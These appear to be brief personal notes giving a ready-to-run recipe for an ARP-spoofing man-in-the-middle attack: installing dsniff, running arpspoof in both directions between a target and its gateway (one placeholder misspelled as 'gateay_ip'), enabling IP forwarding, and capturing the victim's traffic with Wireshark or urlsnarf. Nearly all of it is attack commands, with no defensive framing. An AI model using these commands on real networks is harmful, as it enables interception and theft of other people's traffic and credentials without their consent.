### Tool

## Arpspoof
```
apt install dsniff
```

use

```
arpspoof -i eth0 -t <target_ip> <gateway_ip>
arpspoof -i eth0 -t <gateay_ip> <target_ip>
```

* enable IP forwarding
```
cat /proc/sys/net/ipv4/ip_forward
// change its value to 1
```

* then 
  * use tools to sniff packets 
  * wireshark
  * `urlsnarf -i eth0`